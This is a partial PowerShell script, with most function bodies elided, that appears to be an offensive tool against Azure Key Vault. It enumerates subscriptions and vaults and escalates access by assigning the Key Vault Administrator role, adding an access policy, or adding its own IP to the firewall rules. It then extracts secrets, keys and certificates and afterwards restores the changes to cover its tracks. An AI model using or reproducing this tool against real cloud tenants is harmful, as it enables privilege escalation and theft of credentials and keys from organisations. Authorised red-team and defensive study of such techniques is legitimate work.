...
function Get-DomainName {
    ...
    try {
        ...
        $a = TimeNow
        Write-Host "[$($a)] Found Tenant ID for $DomainName -> $TenantID" -ForegroundColor Gray
        return $TenantID
    } catch {
...
function Extract-VaultData {
    ...
    $kinds = @(
        @{ 
            Kind = "Secret"
            ListUri = "https://$VaultName.vault.azure.net/secrets?api-version=7.4" 
        },
        @{ 
            Kind = "Key"
            ListUri = "https://$VaultName.vault.azure.net/keys?api-version=7.4" 
        },
        @{ 
            Kind = "Certificate"
            ListUri = "https://$VaultName.vault.azure.net/certificates?api-version=7.4" 
        }
    )
    ...
    foreach ($k in $kinds) {
        $a = TimeNow
        Write-Host "    [!] Extracting $($k.Kind)s ($($a))" -ForegroundColor DarkGray
        $uri = $k.ListUri
    ...
    if ($firewallBlocked) {
        Write-Host "[!] Firewall blocked - extracted $extracted items before block" -ForegroundColor Gray
...
function Add-VaultAccess {
    ...
    switch ($EscalateMethod) {
        ...
        "RBAC-RoleAssign" {
            ...
            try {
                ...
                $a = TimeNow
                Write-Host "    [+] Key Vault Administrator role added ($($a))" -ForegroundColor DarkGray
            }
            catch { Write-Host "[-] Failed to add role: $_" -ForegroundColor Gray }
        }

        "IPOnly" {
            Write-Host "[+] Data permissions exist - bypassing firewall only " -ForegroundColor Gray
        ...
        "AP-Write" {
            ...
            try {
                ...
                $a = TimeNow
                Write-Host "[+] Access Policy added ($($a))" -ForegroundColor Gray
            }
    ...
    if ($MyIP) {
        try {
            ...
            $a = TimeNow
            Write-Host "    [+] IP $MyIP added to network rules ($($a))" -ForegroundColor DarkGray
        }
...
function Remove-VaultAccess {
    ...
    $a = TimeNow
    Write-Host "    [+] Restoring changes ($($a))" -ForegroundColor DarkGray
    $headers = Get-AuthHeaders
    ...
    if ($Changes.IPAdded) {
        try {
            ...
            $null = Invoke-SmartRequest -Method "PATCH" -Uri "https://management.azure.com$VaultId`?api-version=2022-07-01" -Headers $headers -Body $patchBody -ContentType "application/json"
            Write-Host "    [+] IP rule removed" -ForegroundColor DarkGray
        }
    ...
    if ($Changes.RoleAdded -and $Changes.RoleAssignmentId) {
        try {
            ...
            Write-Host "    [+] Role assignment removed ($($a))" -ForegroundColor DarkGray
        }
    ...
    if ($Changes.APAdded) {
        try {
            ...
            $a = TimeNow
            Write-Host "[+] Access Policy removed ($($a))" -ForegroundColor Gray
        }
    ...
    if ($Changes.RBACDisabled) {
        try {
            ...
            $a = TimeNow
            Write-Host "[+] RBAC re-enabled ($($a))" -ForegroundColor Gray
        }
...
function main {
    ...
    $myIP = GetIP
    if ($myIP) { 
		Write-Host "[^^] My IP: $myIP" -ForegroundColor DarkGray 
	}
	...
	$a = DateMe
    Write-Host "`n[*] Enumeration of Subscriptions $($a)" -ForegroundColor Gray
    ...
    foreach ($s in $subs) {
        Write-Host "    [+] $($s.DisplayName) ($($s.SubscriptionId)) [$($s.State)]" -ForegroundColor DarkGray
    }
    ...
    foreach ($sub in $subs) {
        ...
        $a = DateMe
        Write-Host "`n[+] Enumeration of Permission on Subscription: $($sub.DisplayName) ($($a))" -ForegroundColor Gray
        ...
        Write-Host "    [+] Subscription: $($sub.DisplayName) [$($sub.SubscriptionId)]" -ForegroundColor DarkGray
        ...
        foreach ($kv in $kvList.value) {
			...
			$a = DateMe
            Write-Host "`n  [+] Key Vault -> $vaultName , Resource Group -> $rg  ($($a))" -ForegroundColor Gray
            ...
            Write-Host "    [+] Managed By: $mode" -ForegroundColor DarkGray
            ...
            if ($canRead) {
                ...
                Write-Host "    [+] Can read: $($readList -join ', ')" -ForegroundColor DarkGray
                ...
                Write-Host "    [!] No direct data access" -ForegroundColor DarkGray
            }
            ...
            Write-Host "    [+] Adding 'Key Vault Administrator' via $($permCheck.EscalateMethod) ($($a))" -ForegroundColor DarkGray
            ...
            if ($anyChange) {
                if ($changes.RoleAdded) {
                    ...
                    for ($attempt = 1; $attempt -le $maxAttempts; $attempt++) {
                        ...
                        elseif ($count -eq -1) {
                            Write-Host "    [!] Still blocked (firewall or propagation). Retrying..." -ForegroundColor DarkGray
                        }
                        else {
                            Write-Host "    [!] No data yet. Role may still be propagating..." -ForegroundColor DarkGray
                        }
                    }
